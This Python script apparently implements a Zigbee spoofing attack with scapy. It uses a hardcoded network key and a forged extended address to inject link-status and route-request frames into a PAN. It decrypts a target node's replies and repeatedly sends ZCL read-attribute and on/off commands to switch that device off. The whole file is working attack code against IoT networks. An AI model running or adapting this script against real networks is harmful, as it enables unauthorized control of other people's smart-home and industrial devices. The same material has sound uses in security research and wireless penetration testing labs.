from random import randint
from zigbee_frames.transceive import Transceiver
from util.wpan_interface import Phy
from scapy.all import conf, CacheInstance, Packet, sniff, sendp, srp1
from scapy.layers.dot15d4 import Dot15d4, Dot15d4Beacon, Dot15d4FCS, Dot15d4Data, Dot15d4Ack
from scapy.layers.zigbee import ZigBeeBeacon, ZigbeeNWK, ZigbeeSecurityHeader, ZigbeeAppDataPayload, ZigbeeClusterLibrary, ZCLGeneralReadAttributes, ZCLGeneralReadAttributesResponse, ZCLReadAttributeStatusRecord, ZigbeeNWKCommandPayload
from util.crypto import CryptoUtils
from zigbee_frames.frameprovider import FrameProvider
from threading import Thread
import logging
from colorama import Fore
import time

# Set up console logger
logging.basicConfig(level=logging.INFO, format=Fore.RESET+'%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# set up the database
database = {
    "network_key" : bytes.fromhex("31701f12dd93150ec4efce97e381ef06"),
    "extended_source_addr" : bytes.fromhex("00:12:4b:00:1c:dd:27:3d".replace(":", "")),
    "pan_id" : 0x1a62,
    "target_node" : 0x943f,
    "nodes" : {},
    "frame_counter" : randint(0, 255) 
    }

class ZigbeeSpoofer:
    def __init__(self, frame_provider: FrameProvider):
        self.frame_provider = frame_provider
        Thread(target=self.spoofing_loop).start()
        
    def spoofing_loop(self):
        while True:
            logging.debug("Sending link status and route request")
            link_status_frame = self.frame_provider.link_status(database["pan_id"])
            logging.debug(f"{Fore.BLUE}---> Packet: {link_status_frame.summary()}")
            sendp(link_status_frame, iface="wpan0", verbose=0)
            route_request_frame = self.frame_provider.many_to_one_route_request(0xfffd, database["pan_id"])
            logging.debug(f"{Fore.BLUE}---> Packet: {route_request_frame.summary()}")
            sendp(route_request_frame, iface="wpan0", verbose=0)
            time.sleep(5)

if __name__ == '__main__':
    
    phy=Phy(int.from_bytes(database["extended_source_addr"]), initial_channel=11, pan_id=database["pan_id"],initialize=True, debug_monitor=False)

    fp = FrameProvider()
    fp.set_security_frame_counter(database["frame_counter"])
    fp.set_extended_source(database["extended_source_addr"])
    fp.set_nwk_key(database["network_key"])
    
    #link status and route request looper on a 5 second interval:
    ZigbeeSpoofer(fp)
    
    
    def response_proc(packet: Packet, transaction_sequence: int) -> bool:
        if packet is not None and packet.src_addr == database["target_node"]:
            logging.info(f"{Fore.GREEN}<--- Packet: {packet.summary()}")
            if packet.haslayer(ZigbeeNWK) and packet.flags & 16:   
                logging.debug(f"{Fore.YELLOW}extended source found: {packet.ext_src:016x}")
                if packet.src_addr not in database["nodes"]:
                    logging.debug(f"{Fore.YELLOW}adding node to database")
                    database["nodes"][packet.src_addr] = packet.ext_src.to_bytes(8, 'big')
            if packet.haslayer(ZigbeeNWK) and packet.flags & 2 and packet.src_addr in database["nodes"]:
                logging.debug(f"network key: {database['network_key'].hex()}")
                decrypted_payload, success = CryptoUtils.zigbee_packet_decrypt(database['network_key'], packet, database["nodes"][packet.src_addr])
                if success:
                    if decrypted_payload.haslayer(ZigbeeClusterLibrary) and decrypted_payload.transaction_sequence == transaction_sequence:
                        logging.info(f"{Fore.YELLOW}decoded frame {decrypted_payload.summary()}")
                        return True

    while True:
        read_attributes_frame, transaction_sequence = fp.zcl_read_attributes(0x0, database["pan_id"], database["target_node"])
        logging.info(f"{Fore.BLUE}---> Packet: {read_attributes_frame.summary()}")
        Transceiver.send_and_receive(read_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
        write_attributes_frame, transaction_sequence = fp.zcl_on_off(0x0, database["pan_id"], database["target_node"], False)
        logging.info(f"{Fore.BLUE}---> Packet: {write_attributes_frame.summary()}")
        Transceiver.send_and_receive(write_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)